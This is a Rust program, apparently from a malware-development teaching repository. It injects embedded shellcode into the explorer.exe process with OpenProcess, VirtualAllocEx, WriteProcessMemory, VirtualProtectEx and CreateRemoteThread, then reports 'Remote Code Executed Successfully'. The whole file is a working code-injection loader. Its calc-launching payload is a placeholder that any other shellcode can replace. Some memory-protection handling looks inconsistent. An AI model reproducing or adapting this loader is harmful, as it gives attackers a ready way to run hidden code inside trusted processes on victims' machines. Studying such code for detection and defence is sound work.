/* 
An Rust Program that injects shellcode into an target process and executes it Remotely.
Github Link: https://github.com/Whitecat18/Rust-for-Malware-Development
*/

#[allow(unused_imports)]
#[allow(unused_import_braces)]
use std::include_bytes;
use std::mem::transmute;
use std::ptr::null_mut;
use sysinfo::*;
use winapi::um::processthreadsapi::CreateRemoteThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::WAIT_FAILED;
use winapi::um::winnt::PROCESS_ALL_ACCESS;
// use winapi::shared::ntdef::FALSE; 
use winapi::shared::minwindef::FALSE;
// use winapi::um::processthreadsapi::OpenProcess;
// // OR
// use winapi::shared::minwindef::FALSE;
use winapi::um::{
    handleapi::CloseHandle, // If you want to free up , you can do it manually ! 
    errhandlingapi::GetLastError,
    winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE},
    processthreadsapi::OpenProcess,
    memoryapi::{WriteProcessMemory,VirtualAllocEx,VirtualProtectEx}};

fn main() -> std::io::Result<()>{

    // ShellCode Link : https://github.com/peterferrie/win-exec-calc-shellcode/tree/master/build/bin
    // Download the shellcode and Execute from it 
    let shellcode = include_bytes!("../w64-exec-calc-shellcode-func.bin");
    let size = shellcode.len();
    let mut system = System::new();
    system.refresh_processes();
    println!("{:?}", shellcode);

    let pid = system
        .processes_by_name("explorer.exe")
        .next()
        .expect("[-] No Process")
        .pid()
        .as_u32();

    unsafe{
        let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if handle == null_mut(){
            panic!("Failed to Get OpenProcess: {}",GetLastError());
        }
        let address = VirtualAllocEx(handle,null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE);
        if address.is_null(){
            panic!("[-] Failed to Get Address: {}", GetLastError());
        }
        let res = WriteProcessMemory(handle, address,shellcode.as_ptr().cast(), size,null_mut());
        if res == FALSE{
            panic!("[-] Failed to Write Process to Memory : {}",GetLastError());
        }
        let mut old = PAGE_READWRITE;
        let res = VirtualProtectEx(handle, address, size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
        }

        let func = transmute(address);
        let thread = CreateRemoteThread(handle,null_mut(), 0, func, null_mut(),0, null_mut());
        
        if thread == null_mut(){
            panic!("[-] Failed to create Remote Process : {}",GetLastError());
        }    
        WaitForSingleObject(thread,WAIT_FAILED);

        let clean = CloseHandle(handle);
        if clean == FALSE{
            println!("[-] Unable to close the Handle!");

        // Just an Info : you dont need to free up space . Rust will automatically take care when goes out of scope ! . If you do so you can do it on your own !

        }
    }
    println!("[+] Remote Code Executed Successfully !");
    Ok(())
}

